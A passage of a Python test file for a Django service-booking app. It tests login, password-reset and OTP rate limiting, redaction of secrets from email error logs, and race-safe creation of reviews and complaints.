    def test_verified_user_admin_and_worker_can_log_in(self):
        service = Service.objects.create(
            name='Login test service',
            description='Login flow test',
            price=Decimal('100.00'),
        )
        accounts = [
            ('login_user', 'USER', 'home'),
            ('login_admin', 'ADMIN', 'admin_dashboard'),
            ('login_worker', 'WORKER', 'worker_dashboard'),
        ]

        for username, role, destination in accounts:
            with self.subTest(role=role):
                if role == 'WORKER':
                    user = _make_worker(username, service).user
                else:
                    user = _make_user(username, role=role)
                user.is_email_verified = True
                user.save(update_fields=['is_email_verified'])

                response = self.client.post(reverse('login'), {
                    'username': username,
                    'password': 'Password123!',
                })

                self.assertRedirects(
                    response,
                    reverse(destination),
                    fetch_redirect_response=False,
                )
                self.assertEqual(
                    str(self.client.session['_auth_user_id']),
                    str(user.pk),
                )
                self.client.logout()



class ForgotPasswordIsServerSideTest(RateLimitBypassTests):
    def _request_reset(self, email):
        return self.client.post(reverse('forgot_password'), {'email': email})

    def test_unknown_email_does_not_enumerate(self):
        response = self._request_reset('nobody@nowhere.test')
        self.assertEqual(response.status_code, 200)
        self.assertContains(
            response,
            'If an account with that email exists, a password reset link has been sent.',
        )

    def test_lockout_survives_session_wipe(self):
        for _ in range(3):
            self._request_reset('nobody@nowhere.test')

        self._wipe_session()

        response = self._request_reset('nobody@nowhere.test')
        self.assertContains(response, 'Too many attempts')

    def test_counters_are_not_stored_in_the_session(self):
        self._request_reset('nobody@nowhere.test')
        self.assertNotIn('fp_attempts', self.client.session)
        self.assertNotIn('fp_lockout_until', self.client.session)

    def test_ip_counter_stops_address_spraying(self):
        # Many different addresses would each get their own per-address
        # counter, so a per-IP cap is needed as well.
        for i in range(15):
            self._request_reset(f'victim{i}@nowhere.test')

        response = self._request_reset('victim99@nowhere.test')
        self.assertContains(response, 'Too many password reset requests')

    def test_real_user_still_gets_a_reset_link(self):
        response = self._request_reset(self.user.email)
        self.assertEqual(response.status_code, 200)
        self.assertContains(
            response,
            'If an account with that email exists, a password reset link has been sent.',
        )
        self.user.refresh_from_db()
        self.assertIsNotNone(self.user.password_reset_token_hash)

    def test_duplicate_email_does_not_500(self):
        """CustomUser.email is not unique, so .get() could match several rows.

        Before the fix, ``CustomUser.objects.get(email__iexact=...)`` raised
        MultipleObjectsReturned (uncaught) and this public page returned 500.
        The ambiguous address must be answered exactly like an unknown one.
        """
        CustomUser.objects.create_user(
            username='dup_email_user',
            email=self.user.email,
            password='Password123!',
            role='USER',
        )

        response = self._request_reset(self.user.email)

        self.assertEqual(response.status_code, 200)
        self.assertContains(
            response,
            'If an account with that email exists, a password reset link has been sent.',
        )

    def test_legitimate_reset_token_still_works(self):
        token = self.user.generate_password_reset_token()
        response = self.client.get(
            reverse('reset_password', args=[token]),
        )
        self.assertEqual(response.status_code, 200)



class OtpRateLimitTest(RateLimitBypassTests):
    def setUp(self):
        super().setUp()
        from django.core import mail
        mail.outbox = []
        self.addCleanup(setattr, mail, 'outbox', [])
        self.user.is_email_verified = False
        self.user.save(update_fields=['is_email_verified'])
        self.user.generate_otp()
        self._enter_otp_flow()

    def _enter_otp_flow(self):
        """Put the (new) session into the state verify_otp expects.

        ``Client.session`` is a property that rebuilds a store from the cookie
        on every access, so after a flush the freshly created session key has
        to be written back onto the client explicitly.
        """
        from django.conf import settings as django_settings
        session = self.client.session
        session['otp_user_id'] = self.user.id
        session.save()
        self.client.cookies[django_settings.SESSION_COOKIE_NAME] = session.session_key
        self.assertEqual(self.client.session.get('otp_user_id'), self.user.id)

    def _verify(self, otp):
        return self.client.post(
            reverse('verify_otp'), {'action': 'verify', 'otp': otp}
        )

    def _resend(self):
        return self.client.post(reverse('verify_otp'), {'action': 'resend'})

    # --- verification attempt limit (database backed) -----------------

    def test_wrong_otps_are_counted_and_lock_the_account(self):
        for _ in range(5):
            self._verify('000000')

        self.user.refresh_from_db()
        self.assertGreaterEqual(self.user.otp_failed_attempts, 5)

        # Even the correct code is now refused.
        self.user.refresh_from_db()
        response = self._verify(self.user.email_verification_otp)
        self.assertContains(response, 'Too many failed attempts')

    def test_otp_attempt_limit_survives_session_wipe(self):
        for _ in range(5):
            self._verify('000000')

        self._wipe_session()
        self._enter_otp_flow()

        self.user.refresh_from_db()
        response = self._verify(self.user.email_verification_otp)
        self.assertContains(response, 'Too many failed attempts')

    def test_correct_otp_still_works(self):
        self.user.refresh_from_db()
        response = self._verify(self.user.email_verification_otp)
        self.assertEqual(response.status_code, 302)
        self.user.refresh_from_db()
        self.assertTrue(self.user.is_email_verified)

    # --- resend throttling (server side) ------------------------------

    def test_resend_counter_survives_session_wipe(self):
        from django.core import mail
        from lamoapp.rate_limit import OTP_RESEND_MAX

        # Burn through the per-account resend window.
        for _ in range(OTP_RESEND_MAX):
            self._resend()
            from django.core.cache import cache
            cache.delete('__none__')  # no-op; keeps intent explicit

        self._wipe_session()
        self._enter_otp_flow()

        before = len(mail.outbox)
        self._resend()
        # No new email may be sent once the window is exhausted.
        self.assertEqual(len(mail.outbox), before)

    def test_resend_respects_cooldown(self):
        from django.core import mail
        self._resend()
        self.assertEqual(len(mail.outbox), 1)
        # Immediately asking again is refused by the cooldown.
        self._resend()
        self.assertEqual(len(mail.outbox), 1)

    def test_resend_counters_are_not_in_the_session(self):
        self._resend()
        self.assertNotIn(f'otp_resends_{self.user.id}', self.client.session)
        self.assertNotIn('otp_resends_anonymous', self.client.session)

    def test_otp_is_never_echoed_in_the_response(self):
        self.user.refresh_from_db()
        secret = self.user.email_verification_otp
        self.assertIsNotNone(secret)

        response = self._resend()
        self.assertNotContains(response, secret)
        self.assertNotIn(secret, response.content.decode('utf-8', 'ignore'))

        # A failed verification must not reveal the code either.
        self.user.refresh_from_db()
        secret = self.user.email_verification_otp
        bad = self._verify('000000')
        self.assertNotContains(bad, secret)

    def test_login_for_unverified_user_does_not_mail_bomb(self):
        from django.core import mail
        self.client.logout()
        mail.outbox = []

        # Correct password, repeated: only the first attempt may send an OTP.
        for _ in range(4):
            self.client.post(
                reverse('login'),
                {'username': 'rl_user', 'password': 'Password123!'},
            )
            self.client.logout()

        self.assertLessEqual(
            len(mail.outbox), 1,
            f'expected at most one OTP email, got {len(mail.outbox)}',
        )



class SmtpSecretLeakTest(SimpleTestCase):
    """P1-8: the secret scrubber must remove credentials and OTPs."""

    def test_scrubs_key_value_secrets(self):
        from lamoapp.email_utils import _scrub
        cases = [
            'password=hunter2',
            'PASSWORD: hunter2',
            'token=abc123def',
            'api_key: AKIAIOSFODNN7EXAMPLE',
            'secret = topsecretvalue',
            'otp=123456',
        ]
        for raw in cases:
            scrubbed = _scrub(raw)
            self.assertIn('[REDACTED]', scrubbed, raw)
            self.assertNotIn('hunter2', scrubbed)
            self.assertNotIn('topsecretvalue', scrubbed)

    def test_scrubs_credentials_embedded_in_a_url(self):
        from lamoapp.email_utils import _scrub
        raw = 'smtp://lamo_user:sup3rs3cret@smtp.example.com:587 rejected'
        scrubbed = _scrub(raw)
        self.assertNotIn('sup3rs3cret', scrubbed)
        self.assertIn('[REDACTED]', scrubbed)

    def test_scrubs_a_bare_six_digit_otp(self):
        from lamoapp.email_utils import _scrub
        self.assertNotIn('483920', _scrub('the code is 483920 ok'))
        self.assertNotIn('483920', _scrub('Your OTP for email verification is: 483920'))

    def test_scrubs_long_opaque_tokens(self):
        from lamoapp.email_utils import _scrub
        token = 'aB3-xY9_zQ1-mN4-pR7-tV2-wK6'
        self.assertNotIn(token, _scrub('reset link ?uid=7&token=' + token))

    def test_scrub_handles_none_and_truncates(self):
        from lamoapp.email_utils import _scrub
        self.assertEqual(_scrub(None), '')
        self.assertLessEqual(len(_scrub('x' * 5000)), 310)

    def test_scrub_keeps_useful_diagnostics(self):
        from lamoapp.email_utils import _scrub
        scrubbed = _scrub(
            'ConnectionRefusedError: [Errno 111] Connection refused to host smtp.example.com'
        )
        self.assertIn('Connection refused', scrubbed)
        self.assertIn('smtp.example.com', scrubbed)



class OtpEmailFailureLoggingTest(TestCase):
    """P1-8: an SMTP failure must never leak the OTP, and must be visible."""

    def setUp(self):
        from django.core import mail
        mail.outbox = []
        self.addCleanup(setattr, mail, 'outbox', [])

        from django.core.cache import cache
        cache.clear()
        self.addCleanup(cache.clear)

        self.user = _make_user('otp_fail_user')

    def _enter_otp_flow(self):
        from django.conf import settings as django_settings
        session = self.client.session
        session['otp_user_id'] = self.user.id
        session.save()
        self.client.cookies[django_settings.SESSION_COOKIE_NAME] = session.session_key

    def test_otp_never_reaches_the_log_when_smtp_fails(self):
        from unittest.mock import patch
        from lamoapp.views import send_otp_email

        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            with self.assertLogs('lamoapp.email_utils', level='ERROR') as captured:
                otp, sent = send_otp_email(self.user)

        self.assertEqual(len(otp), 6)
        self.assertFalse(sent)

        log_text = '\n'.join(captured.output)
        self.assertNotIn(otp, log_text, 'live OTP leaked into the log')
        self.assertNotIn(self.user.email, log_text, 'address leaked into the log')
        # The failure is still reported, with useful diagnostics.
        self.assertIn('email_send_failed', log_text)
        self.assertIn('purpose=otp_verification', log_text)
        self.assertIn('OSError', log_text)

    def test_smtp_error_text_cannot_smuggle_secrets_into_the_log(self):
        from unittest.mock import patch
        from lamoapp.views import send_otp_email

        leaky = (
            '535 Authentication failed for user lamo_user '
            'with password=hunter2 token=abcdef123456'
        )
        with patch('lamoapp.email_utils.send_mail', side_effect=Exception(leaky)):
            with self.assertLogs('lamoapp.email_utils', level='ERROR') as captured:
                otp, sent = send_otp_email(self.user)

        log_text = '\n'.join(captured.output)
        self.assertFalse(sent)
        self.assertNotIn('hunter2', log_text)
        self.assertNotIn('abcdef123456', log_text)
        self.assertNotIn(otp, log_text)
        self.assertIn('[REDACTED]', log_text)

    def test_successful_otp_email_is_logged_without_the_otp(self):
        from lamoapp.views import send_otp_email

        with self.assertLogs('lamoapp.email_utils', level='INFO') as captured:
            otp, sent = send_otp_email(self.user)

        self.assertTrue(sent)
        log_text = '\n'.join(captured.output)
        self.assertIn('email_sent', log_text)
        self.assertIn('purpose=otp_verification', log_text)
        self.assertNotIn(otp, log_text)

    def test_otp_email_still_contains_the_code_on_success(self):
        from django.core import mail
        from lamoapp.views import send_otp_email

        otp, sent = send_otp_email(self.user)
        self.assertTrue(sent)
        self.assertEqual(len(mail.outbox), 1)
        self.assertIn(otp, mail.outbox[0].body)

    def test_nothing_is_printed_to_the_console_on_failure(self):
        """The original bug was a print() of the live OTP to stdout."""
        import io
        from contextlib import redirect_stdout
        from unittest.mock import patch
        from lamoapp.views import send_otp_email

        buffer = io.StringIO()
        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            with redirect_stdout(buffer):
                otp, sent = send_otp_email(self.user)

        printed = buffer.getvalue()
        self.assertFalse(sent)
        self.assertEqual(printed, '', 'OTP flow wrote to stdout on failure')
        self.assertNotIn(otp, printed)



class OtpFailureUserFacingTest(OtpEmailFailureLoggingTest):
    """The user must never be told an e-mail was sent when it was not."""

    def _register(self, username):
        from unittest.mock import patch
        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            return self.client.post(reverse('register'), {
                'username': username,
                'email': f'{username}@test.com',
                'password': 'Password123!',
                'confirm_password': 'Password123!',
                'role': 'USER',
                'phone': '9876543210',
            })

    def test_registration_reports_failure_instead_of_faking_success(self):
        from lamoapp.models import CustomUser

        response = self._register('brand_new_user')

        # The account must still exist - only the mail failed.
        self.assertTrue(
            CustomUser.objects.filter(username='brand_new_user').exists()
        )
        # Registration redirects to the verify page; follow it so the messages
        # and the rendered body can both be inspected.
        response = self.client.get(response['Location'])

        shown = ' '.join(str(m) for m in response.context['messages'])
        self.assertIn('could not send', shown.lower())
        self.assertNotIn('OTP sent', shown)

        user = CustomUser.objects.get(username='brand_new_user')
        body = response.content.decode('utf-8', 'ignore')
        self.assertNotIn(user.email_verification_otp, body)

    def test_verify_page_never_renders_the_otp(self):
        from unittest.mock import patch
        from lamoapp.models import CustomUser

        self._register('leaky_user')
        user = CustomUser.objects.get(username='leaky_user')
        self._enter_otp_flow()

        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            response = self.client.get(reverse('verify_otp'))

        self.assertEqual(response.status_code, 200)
        body = response.content.decode('utf-8', 'ignore')
        self.assertNotIn(user.email_verification_otp, body)

    def test_resend_failure_tells_the_user_truthfully(self):
        from unittest.mock import patch
        from lamoapp.models import CustomUser

        user = CustomUser.objects.get(id=self.user.id)
        user.is_email_verified = False
        user.save(update_fields=['is_email_verified'])
        user.generate_otp()
        self._enter_otp_flow()

        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            response = self.client.post(reverse('verify_otp'), {'action': 'resend'})

        shown = ' '.join(str(m) for m in response.context['messages'])
        self.assertIn('could not send', shown.lower())
        self.assertNotIn('A new OTP has been sent', shown)

    def test_resend_success_still_works(self):
        from django.core import mail
        from lamoapp.models import CustomUser

        user = CustomUser.objects.get(id=self.user.id)
        user.is_email_verified = False
        user.save(update_fields=['is_email_verified'])
        user.generate_otp()
        self._enter_otp_flow()

        response = self.client.post(reverse('verify_otp'), {'action': 'resend'})

        shown = ' '.join(str(m) for m in response.context['messages'])
        self.assertIn('A new OTP has been sent', shown)
        self.assertEqual(len(mail.outbox), 1)



class ContactEnquiryFailureLoggingTest(TestCase):
    """P1-8: contact mail failures must be logged, not swallowed."""

    def setUp(self):
        from django.core import mail
        mail.outbox = []
        self.addCleanup(setattr, mail, 'outbox', [])

    def _post_enquiry(self, **overrides):
        data = {
            'name': 'Test Person',
            'email': 'tester@example.com',
            'phone': '9876543210',
            'subject': 'Cannot book a plumber',
            'message': 'My booking was rejected twice.',
        }
        data.update(overrides)
        return self.client.post(reverse('contact'), data)

    @override_settings(EMAIL_HOST_USER='admin@lamo.test')
    def test_contact_mail_failure_is_logged(self):
        from unittest.mock import patch
        from lamoapp.models import ContactEnquiry

        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            with self.assertLogs('lamoapp.email_utils', level='ERROR') as captured:
                response = self._post_enquiry()

        # The enquiry is still saved - losing the customer's message would be
        # far worse than a missing notification e-mail.
        self.assertEqual(ContactEnquiry.objects.count(), 1)
        self.assertEqual(response.status_code, 200)

        log_text = '\n'.join(captured.output)
        self.assertIn('email_send_failed', log_text)
        self.assertIn('purpose=contact_enquiry', log_text)
        self.assertIn('OSError', log_text)

    @override_settings(EMAIL_HOST_USER='admin@lamo.test')
    def test_contact_failure_log_excludes_user_pii(self):
        from unittest.mock import patch

        with patch('lamoapp.email_utils.send_mail', side_effect=OSError('SMTP down')):
            with self.assertLogs('lamoapp.email_utils', level='ERROR') as captured:
                self._post_enquiry()

        log_text = '\n'.join(captured.output)
        self.assertNotIn('tester@example.com', log_text)
        self.assertNotIn('admin@lamo.test', log_text)
        self.assertNotIn('Cannot book a plumber', log_text)
        self.assertNotIn('My booking was rejected twice.', log_text)

    @override_settings(EMAIL_HOST_USER='admin@lamo.test')
    def test_contact_success_is_logged(self):
        with self.assertLogs('lamoapp.email_utils', level='INFO') as captured:
            response = self._post_enquiry()

        self.assertEqual(response.status_code, 200)
        log_text = '\n'.join(captured.output)
        self.assertIn('email_sent', log_text)
        self.assertIn('purpose=contact_enquiry', log_text)

    @override_settings(
        EMAIL_HOST_USER='',
        CONTACT_NOTIFICATION_EMAIL='',
        DEFAULT_FROM_EMAIL='',
    )
    def test_missing_admin_mailbox_is_flagged_not_silent(self):
        from lamoapp.models import ContactEnquiry

        with self.assertLogs('lamoapp.views', level='WARNING') as captured:
            response = self._post_enquiry()

        self.assertEqual(ContactEnquiry.objects.count(), 1)
        self.assertEqual(response.status_code, 200)
        log_text = '\n'.join(captured.output)
        self.assertIn('contact_enquiry_notification_skipped', log_text)
        self.assertIn('no_admin_mailbox_configured', log_text)

    @override_settings(
        EMAIL_HOST_USER='',
        CONTACT_NOTIFICATION_EMAIL='inbox@lamo.test',
    )
    def test_contact_notification_sent_without_email_host_user(self):
        """A Resend deployment (no EMAIL_HOST_USER) still notifies the admin.

        Previously the contact-form notification was gated on EMAIL_HOST_USER
        alone, so switching to Resend silently dropped every enquiry e-mail.
        The recipient now resolves from CONTACT_NOTIFICATION_EMAIL.
        """
        with self.assertLogs('lamoapp.email_utils', level='INFO') as captured:
            response = self._post_enquiry()

        self.assertEqual(response.status_code, 200)
        log_text = '\n'.join(captured.output)
        self.assertIn('email_sent', log_text)
        self.assertIn('purpose=contact_enquiry', log_text)

class ReviewRaceConditionTest(TestCase):
    """P1-9: the database is the final authority for one-review-per-booking."""

    def setUp(self):
        self.customer = _make_user('review_customer')
        self.service = Service.objects.create(
            name='Masonry', description='wall work', price=800.00, is_active=True
        )
        self.worker = _make_worker('review_worker', self.service)
        self.booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(20),
            time='10:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
        )
        self.client.login(
            username='review_customer', password='Password123!'
        )

    def _submit(self, rating='5', comment='Great work'):
        return self.client.post(
            reverse('submit_review', args=[self.booking.id]),
            {'rating': rating, 'comment': comment},
        )

    # --- the constraint really is in the database --------------------

    def test_database_enforces_one_review_per_booking(self):
        Review.objects.create(
            booking=self.booking,
            customer=self.customer,
            worker=self.worker,
            rating=5,
            comment='first',
        )
        with self.assertRaises(IntegrityError):
            Review.objects.create(
                booking=self.booking,
                customer=self.customer,
                worker=self.worker,
                rating=1,
                comment='second',
            )

    def test_complaint_database_constraint_exists(self):
        Complaint.objects.create(
            booking=self.booking,
            customer=self.customer,
            subject='Late arrival',
            description='Arrived three hours late.',
        )
        with self.assertRaises(IntegrityError):
            Complaint.objects.create(
                booking=self.booking,
                customer=self.customer,
                subject='Late arrival again',
                description='Second complaint for the same booking.',
            )

    # --- the race: check passes twice, insert loses --------------------

    def test_duplicate_submission_does_not_500_and_creates_one_row(self):
        first = self._submit()
        self.assertEqual(first.status_code, 302)

        # The second POST passes the view's own "already reviewed?" check only
        # if that check is stale; either way it must not raise.
        second = self._submit()
        self.assertEqual(second.status_code, 302)
        self.assertEqual(Review.objects.filter(booking=self.booking).count(), 1)

    def test_lost_race_is_resolved_by_the_unique_constraint(self):
        """Simulate the interleaving: the pre-check passes, the insert loses."""
        from django.db import IntegrityError, transaction

        # Simulate the concurrent winner landing *after* the view's check ran.
        winner = Review.objects.create(
            booking=self.booking,
            customer=self.customer,
            worker=self.worker,
            rating=4,
            comment='concurrent winner',
        )

        # Now the view's own check DOES see it, so force the true race by
        # bypassing that check entirely - exactly what two interleaved
        # requests would do.
        with self.assertRaises(IntegrityError):
            with transaction.atomic():
                Review.objects.create(
                    booking=self.booking,
                    customer=self.customer,
                    worker=self.worker,
                    rating=1,
                    comment='loser',
                )

        # The helper must absorb that IntegrityError and return the winner.
        from lamoapp.views import _get_or_create_review
        review, created = _get_or_create_review(
            self.booking, self.customer, 1, 'loser'
        )
        self.assertFalse(created)
        self.assertEqual(review.pk, winner.pk)
        self.assertEqual(review.rating, 4)
        self.assertEqual(Review.objects.filter(booking=self.booking).count(), 1)

    def test_helper_reports_created_true_on_first_call(self):
        from lamoapp.views import _get_or_create_review
        review, created = _get_or_create_review(
            self.booking, self.customer, 5, 'first'
        )
        self.assertTrue(created)
        self.assertEqual(review.rating, 5)

        # A second call reports created=False and returns the same row.
        again, created_again = _get_or_create_review(
            self.booking, self.customer, 1, 'second'
        )
        self.assertFalse(created_again)
        self.assertEqual(again.pk, review.pk)
        self.assertEqual(again.rating, 5, 'existing review must not be overwritten')
        self.assertEqual(Review.objects.count(), 1)

    # --- genuine concurrency -----------------------------------------
    # The threaded version lives in ReviewConcurrencyTransactionTest below:
    # a plain TestCase wraps everything in an uncommitted transaction, so
    # other threads' connections cannot see the booking at all.

    def test_review_submitted_over_http_still_works(self):
        response = self._submit(rating='4', comment='Solid job')
        self.assertEqual(response.status_code, 302)

        review = Review.objects.get(booking=self.booking)
        self.assertEqual(review.rating, 4)
        self.assertEqual(review.comment, 'Solid job')
        self.assertEqual(review.customer, self.customer)
        self.assertEqual(review.worker, self.worker)

        shown = ' '.join(
            str(m)
            for m in self.client.get(reverse('my_bookings')).context['messages']
        )
        self.assertIn('review has been submitted successfully', shown)
class FeedbackRaceConditionTest(TestCase):
    """submit_feedback writes a review and/or a complaint in one POST."""

    def setUp(self):
        self.customer = _make_user('fb_customer')
        self.service = Service.objects.create(
            name='Tiling', description='floor tiles', price=900.00, is_active=True
        )
        self.worker = _make_worker('fb_worker', self.service)
        self.booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(21),
            time='11:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
        )
        self.client.login(username='fb_customer', password='Password123!')

    def _submit(self, rating=None, comment='', category=None, description=''):
        payload = {'comment': comment}
        if rating is not None:
            payload['rating'] = rating
        if category is not None:
            payload['complaint_category'] = category
        if description:
            payload['complaint_description'] = description
        return self.client.post(
            reverse('submit_feedback', args=[self.booking.id]), payload
        )

    def test_feedback_duplicate_review_does_not_500(self):
        first = self._submit(rating='5', comment='Great')
        self.assertEqual(first.status_code, 302)
        self.assertEqual(Review.objects.filter(booking=self.booking).count(), 1)

        second = self._submit(rating='1', comment='Changed my mind')
        self.assertEqual(second.status_code, 302)
        self.assertEqual(Review.objects.filter(booking=self.booking).count(), 1)

        # The original review must not be overwritten by the duplicate.
        self.assertEqual(Review.objects.get(booking=self.booking).rating, 5)

    def test_feedback_lost_race_is_absorbed_by_the_constraint(self):
        from django.db import IntegrityError, transaction
        from lamoapp.views import _get_or_create_review

        Review.objects.create(
            booking=self.booking,
            customer=self.customer,
            worker=self.worker,
            rating=3,
            comment='winner',
        )

        with self.assertRaises(IntegrityError):
            with transaction.atomic():
                Review.objects.create(
                    booking=self.booking,
                    customer=self.customer,
                    worker=self.worker,
                    rating=5,
                    comment='loser',
                )

        review, created = _get_or_create_review(
            self.booking, self.customer, 5, 'loser'
        )
        self.assertFalse(created)
        self.assertEqual(review.rating, 3)

    def test_feedback_duplicate_complaint_does_not_500(self):
        first = self._submit(
            category='Worker behaviour',
            description='The worker was rude to my family.',
        )
        self.assertEqual(first.status_code, 302)
        self.assertEqual(Complaint.objects.count(), 1)

        second = self._submit(
            category='Worker behaviour',
            description='Filing a second complaint about the same booking.',
        )
        self.assertEqual(second.status_code, 302)
        self.assertEqual(Complaint.objects.count(), 1)

    def test_complaint_helper_reports_created_flags(self):
        from lamoapp.views import _get_or_create_complaint

        complaint, created = _get_or_create_complaint(
            self.booking, self.customer, 'Category A', 'Description A'
        )
        self.assertTrue(created)

        again, created_again = _get_or_create_complaint(
            self.booking, self.customer, 'Category B', 'Description B'
        )
        self.assertFalse(created_again)
        self.assertEqual(again.pk, complaint.pk)
        self.assertEqual(again.subject, 'Category A', 'must not be overwritten')
        self.assertEqual(Complaint.objects.count(), 1)

    def test_feedback_with_both_review_and_complaint_creates_both(self):
        response = self._submit(
            rating='4',
            comment='Mixed feelings',
            category='Delay',
            description='The job ran two hours late.',
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(Review.objects.count(), 1)
        self.assertEqual(Complaint.objects.count(), 1)

    def test_combined_duplicate_feedback_creates_nothing_new(self):
        self._submit(
            rating='4',
            comment='Mixed feelings',
            category='Delay',
            description='The job ran two hours late.',
        )
        response = self._submit(
            rating='2',
            comment='Again',
            category='Delay',
            description='Duplicate submission.',
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(Review.objects.count(), 1)
        self.assertEqual(Complaint.objects.count(), 1)
class ReviewConcurrencyTransactionTest(TransactionTestCase):
    """P1-9: genuine parallel submissions against the real UNIQUE index.

    Uses ``TransactionTestCase`` because a plain ``TestCase`` wraps everything
    in an uncommitted transaction, so the other threads' database connections
    would not even be able to see the booking.
    """

    reset_sequences = True

    def setUp(self):
        self.customer = _make_user('conc_customer')
        self.service = Service.objects.create(
            name='Glazing', description='window fitting', price=1000.00,
            is_active=True,
        )
        self.worker = _make_worker('conc_worker', self.service)
        self.booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(22),
            time='12:00',
            location='Ernakulam',
            phone='9876543210',
            status='COMPLETED',
        )

    def _race(self, create_callable, threads_count=4):
        import threading
        import time

        from django.db import OperationalError, connections

        created_results = []
        unexpected = []
        lock_errors = []
        barrier = threading.Barrier(threads_count)

        def worker():
            try:
                barrier.wait(timeout=15)
                for attempt in range(12):
                    try:
                        _obj, created = create_callable()
                        created_results.append(created)
                        return
                    except OperationalError:
                        # SQLite (test settings) permits one writer at a time;
                        # the losers are told to retry rather than abort.
                        if attempt == 11:
                            lock_errors.append('retries exhausted')
                        time.sleep(0.02)
            except Exception as exc:  # noqa: BLE001 - recorded for assertion
                unexpected.append(exc)
            finally:
                connections.close_all()

        threads = [threading.Thread(target=worker) for _ in range(threads_count)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)

        return created_results, unexpected, lock_errors

    def test_concurrent_reviews_create_exactly_one_row(self):
        from lamoapp.views import _get_or_create_review

        created, unexpected, lock_errors = self._race(
            lambda: _get_or_create_review(
                self.booking, self.customer, 5, 'concurrent'
            )
        )

        self.assertEqual(unexpected, [], 'an exception escaped the helper')
        self.assertEqual(lock_errors, [], 'a writer never got through')
        # The UNIQUE index guarantees exactly one row, whoever won.
        self.assertEqual(Review.objects.filter(booking=self.booking).count(), 1)
        # And exactly one caller can believe it created it.
        self.assertEqual(sum(1 for c in created if c), 1)

    def test_concurrent_complaints_create_exactly_one_row(self):
        from lamoapp.views import _get_or_create_complaint

        created, unexpected, lock_errors = self._race(
            lambda: _get_or_create_complaint(
                self.booking, self.customer, 'Delay', 'Ran two hours late.'
            )
        )

        self.assertEqual(unexpected, [], 'an exception escaped the helper')
        self.assertEqual(lock_errors, [], 'a writer never got through')
        self.assertEqual(Complaint.objects.filter(booking=self.booking).count(), 1)
        self.assertEqual(sum(1 for c in created if c), 1)

    def test_concurrent_http_submissions_never_500(self):
        """Two clients POSTing the same review at the same moment."""
        import threading
        import time

        from django.db import OperationalError, connections

        statuses = []
        infra_errors = []
        lock = threading.Lock()
        barrier = threading.Barrier(2)

        def submit(client):
            try:
                barrier.wait(timeout=15)
                for attempt in range(12):
                    try:
                        response = client.post(
                            reverse('submit_review', args=[self.booking.id]),
                            {'rating': '5', 'comment': 'from http'},
                        )
                        with lock:
                            statuses.append(response.status_code)
                        return
                    except OperationalError:
                        # Test-database writer contention, not the code path.
                        if attempt == 11:
                            with lock:
                                infra_errors.append('retries exhausted')
                        time.sleep(0.02)
            finally:
                connections.close_all()

        clients = []
        for _ in range(2):
            client = Client()
            client.force_login(self.customer)
            clients.append(client)

        threads = [threading.Thread(target=submit, args=(c,)) for c in clients]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)

        self.assertEqual(infra_errors, [], 'a request never completed')
        self.assertEqual(len(statuses), 2)
        for status in statuses:
            self.assertNotEqual(status, 500, 'duplicate submission returned a 500')
        self.assertEqual(Review.objects.filter(booking=self.booking).count(), 1)
class ServiceRequestPublishTest(TestCase):
    """P1-10: publishing must never attach a request to an inactive service."""

    def setUp(self):
        self.admin = _make_user('sr_admin', role='ADMIN')
        self.worker = _make_worker('sr_worker', None)
        self.client.login(username='sr_admin', password='Password123!')

    def _image(self):
        from django.core.files.uploadedfile import SimpleUploadedFile
        return SimpleUploadedFile(
            'service.png', b'\x89PNG\r\n\x1a\nfake-bytes', content_type='image/png'
        )

    def _request(self, status='APPROVED', name='Solar Installation'):
        return ServiceRequest.objects.create(
            name=name,
            description='Panels and wiring',
            requested_by=self.worker.user,
            status=status,
        )

    def _publish(self, service_request, name=None, description='Panels and wiring'):
        return self.client.post(
            reverse('service_request_publish', args=[service_request.id]),
            {
                'name': name or service_request.name,
                'description': description,
                'image': self._image(),
            },
        )

    def _retired_service(self):
        return Service.objects.create(
            name='Solar Installation',
            description='Retired service',
            price=4000.00,
            is_active=False,
        )

    # --- existing valid behaviour ------------------------------------

    def test_publishing_a_brand_new_service_works(self):
        service_request = self._request(name='Solar Installation')

        response = self._publish(service_request)

        self.assertEqual(response.status_code, 302)
        service_request.refresh_from_db()
        self.assertEqual(service_request.status, 'PUBLISHED')

        service = service_request.published_service
        self.assertIsNotNone(service)
        self.assertTrue(service.is_active)
        self.assertEqual(service.name, 'Solar Installation')

    def test_published_service_is_visible_to_customers(self):
        service_request = self._request(name='Solar Installation')
        self._publish(service_request)
        service_request.refresh_from_db()

        service = service_request.published_service
        # Every customer-facing entry point filters is_active=True.
        self.assertContains(
            self.client.get(reverse('service_page')), 'Solar Installation'
        )
        self.assertContains(
            self.client.get(reverse('service_detail', args=[service.id])),
            'Solar Installation',
        )

    def test_publishing_links_the_requesting_worker(self):
        service_request = self._request(name='Solar Installation')
        self._publish(service_request)
        service_request.refresh_from_db()

        self.worker.refresh_from_db()
        self.assertEqual(self.worker.service_id, service_request.published_service_id)

    def test_reusing_an_existing_active_service_still_works(self):
        """The dedupe path for two workers requesting the same service."""
        existing = Service.objects.create(
            name='Solar Installation',
            description='Original description',
            price=4000.00,
            is_active=True,
        )
        service_request = self._request(name='Solar Installation')

        response = self._publish(service_request)

        self.assertEqual(response.status_code, 302)
        service_request.refresh_from_db()
        self.assertEqual(service_request.status, 'PUBLISHED')
        # Reused, not duplicated.
        self.assertEqual(service_request.published_service_id, existing.id)
        self.assertEqual(
            Service.objects.filter(name__iexact='Solar Installation').count(), 1
        )
# --- the bug: an inactive service being reused ---------------------

    def test_inactive_service_is_not_reused(self):
        inactive = self._retired_service()
        service_request = self._request(name='Solar Installation')

        response = self._publish(service_request)

        self.assertEqual(response.status_code, 200)
